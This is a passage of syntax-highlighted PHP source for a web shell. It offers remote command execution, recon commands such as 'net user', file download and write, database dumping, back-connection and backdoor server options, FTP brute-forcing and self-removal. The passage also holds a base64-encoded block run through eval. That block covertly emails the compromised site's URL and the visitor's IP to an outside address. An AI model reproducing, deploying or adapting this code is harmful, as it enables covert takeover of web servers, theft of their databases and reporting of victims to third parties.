        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find r57shell in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find /c </span><span class="se">\&quot;</span><span class="s2">r57</span><span class="se">\&quot;</span><span class="s2"> *&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find tpshell in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find /c </span><span class="se">\&quot;</span><span class="s2">tp</span><span class="se">\&quot;</span><span class="s2"> *&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Show active connections&quot;</span><span class="p">,</span> <span class="s2">&quot;netstat -an&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Show running services&quot;</span><span class="p">,</span> <span class="s2">&quot;net start&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;User accounts&quot;</span><span class="p">,</span> <span class="s2">&quot;net user&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Show computers&quot;</span><span class="p">,</span> <span class="s2">&quot;net view&quot;</span><span class="p">),</span>
      <span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;tools&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nx">tools</span><span class="p">();</span> <span class="p">}</span>
    <span class="nv">$phpfsaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Read File&quot;</span><span class="p">,</span> <span class="s2">&quot;read&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Write File (PHP5)&quot;</span><span class="p">,</span> <span class="s2">&quot;write&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;File&quot;</span><span class="p">,</span><span class="s2">&quot;Text&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Copy&quot;</span><span class="p">,</span> <span class="s2">&quot;copy&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;From&quot;</span><span class="p">,</span> <span class="s2">&quot;To&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Rename/Move&quot;</span><span class="p">,</span> <span class="s2">&quot;rename&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;To&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Delete&quot;</span><span class="p">,</span> <span class="s2">&quot;delete&quot;</span><span class="p">,</span> <span class="mi">1</span> <span class="p">,</span><span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Make Dir&quot;</span><span class="p">,</span><span class="s2">&quot;mkdir&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;Dir&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Download&quot;</span><span class="p">,</span> <span class="s2">&quot;download&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;URL&quot;</span><span class="p">,</span> <span class="s2">&quot;To&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Download (Binary Safe)&quot;</span><span class="p">,</span> <span class="s2">&quot;downloadbin&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;URL&quot;</span><span class="p">,</span> <span class="s2">&quot;To&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Change Perm (0755)&quot;</span><span class="p">,</span> <span class="s2">&quot;chmod&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;Perms&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find Writable Dir&quot;</span><span class="p">,</span> <span class="s2">&quot;fwritabledir&quot;</span><span class="p">,</span> <span class="mi">2</span> <span class="p">,</span><span class="s2">&quot;Dir&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find Pathname Pattern&quot;</span><span class="p">,</span> <span class="s2">&quot;glob&quot;</span><span class="p">,</span><span class="mi">2</span> <span class="p">,</span><span class="s2">&quot;Dir&quot;</span><span class="p">,</span> <span class="s2">&quot;Pattern&quot;</span><span class="p">),</span>
    <span class="p">);</span>
     
    <span class="nv">$quicklaunch1</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=home</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Home</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=back</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Back</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">history.back(1)&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=forward</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Forward</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">history.go(1)&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=up</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Up</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=%upd&amp;sort=%sort&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=search</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Search</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=search&amp;d=%d&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=buffer</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Buffer</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=fsbuff&amp;d=%d&quot;</span><span class="p">)</span>
    <span class="p">);</span>
    <span class="nv">$quicklaunch2</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;[ System Info ]&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=security&amp;d=%d&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;[ Processes ]&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=processes&amp;d=%d&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;[ SQL Manager ]&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;d=%d&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;[ Eval ]&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=eval&amp;d=%d&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;[ Encoder ]&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=encoder&amp;d=%d&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;[ Mailer ]&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=mler&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;[ Back Connection ]&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=backc&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;[ Backdoor Server ]&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=backd&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;[ Kernel Exploit Search ]&quot;</span><span class="p">,</span><span class="nv">$millink</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;[ MD5 Decrypter ]&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=dec&quot;</span><span class="p">),</span>
    <span class="k">array</span><span class="p">(</span><span class="s2">&quot;[ Reverse IP ]&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=rev&quot;</span><span class="p">),</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">&quot;[ Kill Shell ]&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=selfremove&quot;</span><span class="p">),</span>
    <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$quicklaunch2</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;br&amp;gt;[ FTP Brute-Force ]&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ftpquickbrute&amp;d=%d&quot;</span><span class="p">);</span>
    <span class="p">}</span>
     
    <span class="nv">$highlight_background</span> <span class="o">=</span> <span class="s2">&quot;#C0C0C0&quot;</span><span class="p">;</span>
    <span class="nv">$highlight_bg</span> <span class="o">=</span> <span class="s2">&quot;#FFFFFF&quot;</span><span class="p">;</span>
    <span class="nv">$highlight_comment</span> <span class="o">=</span> <span class="s2">&quot;#6A6A6A&quot;</span><span class="p">;</span>
    <span class="nv">$highlight_default</span> <span class="o">=</span> <span class="s2">&quot;#0000BB&quot;</span><span class="p">;</span>
    <span class="nv">$highlight_html</span> <span class="o">=</span> <span class="s2">&quot;#1300FF&quot;</span><span class="p">;</span>
    <span class="nv">$highlight_keyword</span> <span class="o">=</span> <span class="s2">&quot;#007700&quot;</span><span class="p">;</span>
    <span class="nv">$highlight_string</span> <span class="o">=</span> <span class="s2">&quot;#000000&quot;</span><span class="p">;</span>
     
    <span class="nv">$fxbuff</span> <span class="o">=</span> <span class="s2">&quot;JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIkZ4MjlTaGVsbCBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gIkJ1ZzogJHRhcmdldCBieSAkdmlzaXRvcjxicj4iOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJnaW1taWV5b3Vyc2hlbGxzQGdtYWlsLmNvbSIsJGp1ZHVsLCRib2R5KTsgfQ0KfQ0KZWxzZSB7ICR2aXNpdGMrKzsgfQ0KQHNldGNvb2tpZSgidmlzaXR6IiwkdmlzaXRjKTs=&quot;</span><span class="p">;</span>
    <span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$fxbuff</span><span class="p">));</span>
     
     
     
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">!=</span> <span class="s2">&quot;img&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$lastdir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
      <span class="nb">chdir</span><span class="p">(</span><span class="nv">$curdir</span><span class="p">);</span>
     
      <span class="k">if</span> <span class="p">(</span><span class="nv">$sort_save</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sort</span><span class="p">))</span> <span class="p">{</span><span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;sort&quot;</span><span class="p">,</span><span class="nv">$sort</span><span class="p">);}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_sort</span><span class="p">))</span> <span class="p">{</span><span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;sql_sort&quot;</span><span class="p">,</span><span class="nv">$sql_sort</span><span class="p">);}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">posix_getpwuid</span><span class="p">(</span><span class="nv">$uid</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">posix_getgrgid</span><span class="p">(</span><span class="nv">$gid</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_kill&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;posix_kill&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">posix_kill</span><span class="p">(</span><span class="nv">$gid</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_dump&quot;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">function</span> <span class="nf">mysql_dump</span><span class="p">(</span><span class="nv">$set</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">global</span> <span class="nv">$sh_ver</span><span class="p">;</span>
          <span class="nv">$sock</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;sock&quot;</span><span class="p">];</span>
          <span class="nv">$db</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;db&quot;</span><span class="p">];</span>
          <span class="nv">$print</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;print&quot;</span><span class="p">];</span>
          <span class="nv">$nl2br</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;nl2br&quot;</span><span class="p">];</span>
          <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">];</span>
          <span class="nv">$add_drop</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;add_drop&quot;</span><span class="p">];</span>
          <span class="nv">$tabs</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;tabs&quot;</span><span class="p">];</span>
          <span class="nv">$onlytabs</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">];</span>
          <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
          <span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Error: </span><span class="se">\$</span><span class="s2">sock is not valid resource.&quot;</span><span class="p">);}</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$db</span><span class="p">))</span> <span class="p">{</span><span class="nv">$db</span> <span class="o">=</span> <span class="s2">&quot;db&quot;</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$print</span><span class="p">))</span> <span class="p">{</span><span class="nv">$print</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$nl2br</span><span class="p">))</span> <span class="p">{</span><span class="nv">$nl2br</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$add_drop</span><span class="p">))</span> <span class="p">{</span><span class="nv">$add_drop</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$tmpdir</span><span class="o">.</span><span class="s2">&quot;dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$tabs</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tabs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$add_drop</span><span class="p">))</span> <span class="p">{</span><span class="nv">$add_drop</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$tabs</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">//Retrieve tables-list</span>
            <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW TABLES FROM &quot;</span><span class="o">.</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tabs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">];}}</span>
          <span class="p">}</span>
          <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&quot;</span>
<span class="s2">          # Dumped by &quot;</span><span class="o">.</span><span class="nv">$sh_name</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">          #</span>
<span class="s2">          # Host settings:</span>
<span class="s2">          # MySQL version: (&quot;</span><span class="o">.</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;) running on &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)&quot;</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">          # Date: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">          # DB: </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$db</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"></span>
<span class="s2">          #---------------------------------------------------------&quot;</span><span class="p">;</span>
          <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$onlytabs</span><span class="p">);</span>
          <span class="k">foreach</span><span class="p">(</span><span class="nv">$tabs</span> <span class="k">as</span> <span class="nv">$tab</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">((</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$tab</span><span class="p">,</span><span class="nv">$onlytabs</span><span class="p">))</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$c</span><span class="p">))</span> <span class="p">{</span>
              <span class="k">if</span> <span class="p">(</span><span class="nv">$add_drop</span><span class="p">)</span> <span class="p">{</span><span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;DROP TABLE IF EXISTS `&quot;</span><span class="o">.</span><span class="nv">$tab</span><span class="o">.</span><span class="s2">&quot;`;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span>
              <span class="c1">//Receieve query for create table structure</span>
              <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW CREATE TABLE `&quot;</span><span class="o">.</span><span class="nv">$tab</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
              <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
                <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;1&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
                <span class="c1">//Receieve table variables</span>
                <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM `</span><span class="si">$tab</span><span class="s2">`&quot;</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                  <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nv">$keys</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;`, `&quot;</span><span class="p">,</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$row</span><span class="p">));</span>
                    <span class="nv">$values</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
                    <span class="k">foreach</span><span class="p">(</span><span class="nv">$values</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span>
                    <span class="nv">$values</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;&#39;, &#39;&quot;</span><span class="p">,</span> <span class="nv">$values</span><span class="p">);</span>
                    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO `</span><span class="si">$tab</span><span class="s2">`(`&quot;</span><span class="o">.</span><span class="nv">$keys</span><span class="o">.</span><span class="s2">&quot;`) VALUES (&#39;&quot;</span><span class="o">.</span><span class="nv">$values</span><span class="o">.</span><span class="s2">&quot;&#39;);</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
                    <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$sql</span><span class="p">;</span>
                  <span class="p">}</span>
                <span class="p">}</span>
              <span class="p">}</span>
            <span class="p">}</span>
          <span class="p">}</span>
          <span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;#---------------------------------------------------------------------------------</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;}</span>
            <span class="k">else</span> <span class="p">{</span>
              <span class="nb">fwrite</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$out</span><span class="p">);</span>
              <span class="nb">fclose</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="p">}</span>
          <span class="p">}</span>
